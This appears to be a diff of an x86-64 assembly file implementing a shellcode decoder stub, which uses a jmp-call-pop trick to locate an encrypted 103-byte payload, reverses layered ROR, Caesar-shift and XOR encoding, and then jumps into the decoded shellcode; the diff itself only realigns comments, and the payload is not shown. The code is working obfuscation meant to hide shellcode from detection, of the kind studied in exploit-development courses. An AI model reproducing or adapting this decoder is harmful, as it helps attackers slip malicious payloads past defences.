@@ -20,32 +20,32 @@ section .text:
 
 _start:
 	
-	jmp short uselessButEssential	;jump to uselessButEssential
+	jmp short uselessButEssential			;jump to uselessButEssential
 
 	init:
-		pop rsi						;get the shellcode address
+		pop rsi					;get the shellcode address
 		xor rbx, rbx				;set to 0 the register we use as index
 		xor rcx, rcx				;set to 0 the register we use as counter
 		xor rdx, rdx				;set to 0 the register we use as a counter to know which decryption function to jump to
 		mov cl, 0x66				;tell our counter the size of our encrypted shellcode - 1 (here 102)
 
 	router1:
-		inc dl						;increment by 1 the counter to know which decryption function to jump to
-		cmp dl, 2					;test if our counter equals 2
+		inc dl					;increment by 1 the counter to know which decryption function to jump to
+		cmp dl, 2				;test if our counter equals 2
 		je decipherROR2				;if yes we jump to decipherROR2
 
 	decipherROR1:
-		ror byte [rsi + rbx], 0x03	;do a bitshift to the right to decipher the first bitshift (here 3)
+		ror byte [rsi + rbx], 0x03		;do a bitshift to the right to decipher the first bitshift (here 3)
 		jmp short manager1			;jump to manager1
 
 	decipherROR2:
-		ror byte [rsi + rbx], 0x05	;do a bitshift to the right to decipher the first bitshift (here 5)
+		ror byte [rsi + rbx], 0x05		;do a bitshift to the right to decipher the first bitshift (here 5)
 		xor rdx, rdx				;set to 0 the register we use as a counter to know which decryption function to jump to
 
 	manager1:
-		add bl, 1					;increment by 1 the index
-		sub cl, 1					;increment by 1 the counter
-		jno router1					;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1
+		add bl, 1				;increment by 1 the index
+		sub cl, 1				;increment by 1 the counter
+		jno router1				;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1
 
 	reset:
 		xor rbx, rbx				;set to 0 the register we use as index
@@ -54,32 +54,32 @@ _start:
 		mov cl, 0x66				;tell our counter the size of our encrypted shellcode - 1 (here 102)
 
 	router2:
-		inc dl						;increment by 1 the register we use as a counter to know which decryption function to jump to
-		cmp dl, 2					;test if our counter equals 2
+		inc dl					;increment by 1 the register we use as a counter to know which decryption function to jump to
+		cmp dl, 2				;test if our counter equals 2
 		je decipherXOR				;if yes we jump to decipherXOR
-		cmp dl, 3					;else we test if out counter equals 3
-		je decipherCesarMinus		;if yes we jump to decipherCesarMinus
+		cmp dl, 3				;else we test if out counter equals 3
+		je decipherCesarMinus			;if yes we jump to decipherCesarMinus
 
 	decipherCesarPlus:
-		sub byte [rsi + rbx], 0x0d	;decrease the value of the current byte to decipher the first cesar (here 13)
+		sub byte [rsi + rbx], 0x0d		;decrease the value of the current byte to decipher the first cesar (here 13)
 		jmp short manager2			;jump to manager2
 
 	decipherXOR:
-		xor byte [rsi + rbx], 0x07	;we XOR the current byte to decipher the XOR (here 7)
+		xor byte [rsi + rbx], 0x07		;we XOR the current byte to decipher the XOR (here 7)
 		jmp short manager2			;jump to manager2
 
 	decipherCesarMinus:
-		add byte [rsi + rbx], 0x12	;we increase the value of the current byte to decipher the second cesar (here 18)
+		add byte [rsi + rbx], 0x12		;we increase the value of the current byte to decipher the second cesar (here 18)
 		xor rdx, rdx				;increment by 1 the register we use as a counter to know which decryption function to jump to
 
 	manager2:
-		add bl, 1					;increment by 1 the index
-		sub cl, 1					;increment by 1 the counter
-		jno router2					;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1
-		jmp rsi						;else we jump to our decrypted shellcode
+		add bl, 1				;increment by 1 the index
+		sub cl, 1				;increment by 1 the counter
+		jno router2				;if our counter doesn't have overflow it means we're not at the end of the chain so we jump to router1
+		jmp rsi					;else we jump to our decrypted shellcode
 
 	uselessButEssential:
-		call init					;call init
+		call init				;call init
 
 ;##############################
 ;#### SHELLCODE GENERATION ####
